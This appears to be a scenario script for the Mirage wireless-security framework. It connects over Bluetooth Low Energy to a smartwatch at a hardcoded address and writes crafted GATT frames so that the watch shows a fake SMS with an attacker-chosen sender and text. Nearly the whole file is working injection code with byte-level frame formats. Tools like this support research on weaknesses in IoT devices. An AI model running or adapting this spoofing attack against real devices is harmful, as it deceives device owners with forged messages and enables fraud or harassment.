from mirage.core import scenario
from mirage.libs import io,ble,esb,utils

class smartwatch_fakesms(scenario.Scenario):

	def onNotification(self,packet):
		self.step+=1

	def onWriteResponse(self,packet):
		self.writeResponse = True

	def onStart(self):
		if "TEXT" in self.module.args:
			content = self.module.args["TEXT"]
		else:
			content = "Wake up, we are sunday, a CDPAC is coming "

		if "SENDER" in self.module.args:
			sender = self.module.args["SENDER"]
		else:
			sender = "POPE"
		print('started')
		self.senderFrame = b"\x6f\x71\x71" + bytes([len(sender)+1]) + b"\x00\x00" + bytes(sender,"ascii") + b"\x8f"
		self.contentFrame = b"\x6f\x71\x71" + bytes([len(content)+1]) + b"\x00\x01" + bytes(content,"ascii") + b"\x8f"

		self.emitter = self.module.emitter
		self.receiver = self.module.receiver
		self.step = 0
		self.receiver.onEvent("BLEHandleValueNotification",callback=self.onNotification)
		self.receiver.onEvent("BLEWriteResponse",callback=self.onWriteResponse)
		self.emitter.sendp(ble.BLEConnect("EC:F3:23:69:95:CD",type="random"))
		while not self.emitter.isConnected():
			utils.wait(seconds=1)
		self.emitter.sendp(ble.BLEWriteRequest(handle=0xe,value=bytes.fromhex("0100")))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteRequest(handle=0x14,value=bytes.fromhex("0100")))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteRequest(handle=0xb,value=self.senderFrame))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteCommand(handle=0xd,value=bytes.fromhex("03")))
		while not self.step == 1:
			pass
		self.emitter.sendp(ble.BLEWriteRequest(handle=0xb,value=self.contentFrame))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteCommand(handle=0xd,value=bytes.fromhex("03")))
		utils.wait(seconds=0.1)
		while not self.step == 2:
			pass
		self.emitter.sendp(ble.BLEWriteRequest(handle=0xb,value=bytes.fromhex("6f71711000023230323030353234543030343831")))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteRequest(handle=0xb,value=bytes.fromhex("398f")))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteCommand(handle=0xd,value=bytes.fromhex("03")))

		while not self.step == 3:
			pass
		self.emitter.sendp(ble.BLEWriteRequest(handle=0xb,value=bytes.fromhex("6f7271020001108f")))
		self.writeResponse = False
		while not self.writeResponse:
			pass
		self.emitter.sendp(ble.BLEWriteCommand(handle=0xd,value=bytes.fromhex("03")))
		while not self.step == 4:
			pass
		self.emitter.sendp(ble.BLEDisconnect())
		return True

	def onEnd(self):
		return True
	
	def onKey(self,key):
		return True
